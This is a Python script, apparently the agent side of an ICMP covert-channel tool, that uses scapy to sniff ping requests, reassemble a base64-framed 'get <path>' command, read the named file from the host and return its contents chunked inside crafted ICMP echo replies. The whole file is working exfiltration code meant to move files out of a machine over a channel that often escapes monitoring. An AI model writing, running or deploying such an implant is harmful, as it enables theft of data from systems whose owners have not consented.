import sys
import base64
import binascii
import argparse
import helper
from scapy.all import sniff, ICMP, IP, Raw, send

SENDING_START_SEQ = "######"
SENDING_END_SEQ = "!!!!!!"
RECEIVING_START_SEQ = b'IyNAQCEh'
RECEVING_END_SEQ = b'ISFAQCMj'

SESSION_START = False
session_byte = b''
ICMP_REPLY_CODE = 0

TEST_COMMAND = b'get'
TEST_REPLY = 'mamamamama'

REPLY_CHUNKS = '1' # how many chunks it takes for the file to send across

# def encodeData(input, type="b64"):
#     encodedInput = str.encode(input)
#     if type == BASE64_ENCODING:
#         return base64.b64encode(encodedInput)
    
#     if type == HEX_ENCODING: 
#         return binascii.hexlify(encodedInput)
    
def replyPayload(packet, payload):
    # Craft custom ICMP echo reply packet
    reply_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                   ICMP(type=ICMP_REPLY_CODE, id=packet[ICMP].id, seq=packet[ICMP].seq) / \
                   payload

    send(reply_packet)

def transmitFile(destination):
    try: 
        f = open(destination, mode="rb")
        data = f.read() 
        return data
    except: 
        return b'file not found'

def process_and_send(session_byte,packet):
    incoming_array = session_byte.split(b' ')
    
    command = incoming_array[0]
    destination = incoming_array[1]

    if command == TEST_COMMAND:
        # encoded_reply = encodeData("reply of a test")
        replyPayload(packet, helper.encodeData(SENDING_START_SEQ))
        payload = transmitFile(destination)
        splitted_payload = helper.splitPayload(payload, 1)
        for i in splitted_payload:
            replyPayload(packet, i)
        replyPayload(packet, helper.encodeData(SENDING_END_SEQ))


def packet_handler(packet):
    if packet.haslayer('ICMP') and packet['ICMP'].type == 8 :
        global SESSION_START
        global session_byte

        if RECEIVING_START_SEQ in packet.load:
            SESSION_START = True
            session_byte = b''


        elif RECEVING_END_SEQ in packet.load:
            SESSION_START = False
            session_byte = helper.decodeData(session_byte)
            process_and_send(session_byte,packet)


        else: 
            session_byte += packet.load

            
def main(): 
    # intialise parser and extract out info
    while True: 
        p = sniff(filter="icmp", prn=packet_handler, store=0)    

if __name__ == "__main__":
    main()
